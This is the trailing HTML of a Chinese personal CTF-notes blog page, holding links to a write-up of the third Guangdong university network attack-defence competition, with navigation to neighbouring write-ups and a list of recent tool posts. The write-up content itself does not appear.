+> 原文链接：[https://www.ctfiot.com/181138.html](https://www.ctfiot.com/181138.html)
+> 仓库原文：[CTF大赛WP集合/articles/第三届广东省大学生网络攻防竞赛WriteUp.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9BWriteUp.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E5%AE%89%E8%B5%9B/">广东大学生网安赛</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Web/%E7%9B%B8%E5%85%B3%E5%88%86%E4%BA%AB-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%8B%9F%E8%B5%9BWriteup/" title="【相关分享】网鼎杯拟赛 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【相关分享】网鼎杯拟赛 Writeup</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Web/%E7%AC%AC%E4%BA%8C%E5%B1%8A_%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9BWriteUp%E5%88%86%E4%BA%AB/" title="第二届黄河流域网络攻防竞赛决赛WriteUp分享"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第二届黄河流域网络攻防竞赛决赛WriteUp分享</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
